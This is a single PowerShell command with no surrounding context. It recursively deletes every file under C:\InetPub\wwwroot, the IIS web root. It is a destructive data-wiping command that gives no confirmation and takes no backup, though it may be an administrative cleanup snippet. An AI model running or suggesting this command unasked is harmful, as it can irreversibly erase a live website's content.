﻿Get-ChildItem -Path C:\InetPub\wwwroot -Include *.* -File -Recurse | foreach { $_.Delete()}
